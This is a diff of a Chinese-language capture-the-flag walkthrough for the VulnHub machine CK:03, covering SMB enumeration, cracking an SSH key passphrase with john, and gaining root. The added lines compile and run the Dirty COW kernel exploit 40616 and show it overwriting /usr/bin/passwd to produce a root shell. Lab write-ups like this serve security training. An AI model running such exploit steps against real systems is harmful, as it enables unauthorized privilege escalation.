@@ -1,4 +1,4 @@
-# CK: 03
+# CK: 03 (MyFileServer_3)
 
 2024-6-13 https://www.vulnhub.com/entry/ck-03,464/
 
@@ -91,8 +91,8 @@ PORT      STATE SERVICE     VERSION
 ```
 smbmap -H 192.168.5.38
 
-Disk                                                  	Permissions	Comment
-----                                                  	-----------	-------
+Disk                                                Permissions	Comment
+----                                                -----------	-------
 print$                                            	NO ACCESS	Printer Drivers
 smbdata                                           	READ, WRITE	smbdata
 smbuser                                           	NO ACCESS	smbuser
@@ -121,7 +121,7 @@ I don't think 'getcap & capsh' known to anyone
 
 这里提示已经将 find 删除，提示使用 getcap & capsh
 
-得到了 id_rsa，尝试用此密钥去登陆 ssh，使用前面发现的 2 个用户 smbuser bla , 发现私钥需要密码，使用 john 进行爆破，得到私钥的密码 password。
+得到了 id_rsa，尝试用此密钥去登陆 ssh，使用前面发现的 2 个用户 smbuser bla , 发现私钥需要密码，使用 john 进行爆破，得到私钥的密码: password。
 
 重新登陆，可以登陆进 samuser 用户。
 
@@ -154,7 +154,24 @@ Why are you here ?!
 ;*3$"
 ```
 
-内核版本 3.10.0-229.el7 Red Hat 4.8.2-16 大概率存在内核提权。
+内核版本 3.10.0-229.el7 Red Hat 4.8.2-16 大概率存在内核提权,经过几个 exp 的测试，最终发现 40616 可以提权：
+
+```
+gcc 40616.c -o 40616 -lpthread
+
+./40616
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 27832
+Racing, this may take a while..
+thread stopped
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+[root@fileserver tmp]# id
+uid=0(root) gid=1000(smbuser) groups=0(root),1000(smbuser)
+```
 
 /etc/shadow 有读取权限：
 
@@ -192,15 +209,6 @@ note: crack it, itiseasy
 
 ```
 
-发现定时任务：
-
-```
-[bla@fileserver ~]$ crontab -l
-* * * * * /home/bla/ynetd -p 1337 /bin/esclate
-```
-
-这里就是最开始 nmap 扫描出现的 1337 端口
-
 sudo -l 发现：
 
 ```
@@ -236,6 +244,15 @@ sh-4.2# cat proof.txt
 
 flag : 7be300997079eaebcdf9975ede6746e9
 ```
+
+/etc/proftpd.conf
+/etc/vsftpd/ftpusers
+/etc/vsftpd/user_list
+/etc/banner.txt
+/etc/ssh/sshd_config
+/var/www/html/readme.txt
+/etc/vsftpd/vsftpd.conf
+/etc/samba/smb.conf
 
 下面的这些信息都是兔子洞，没什么用。
 
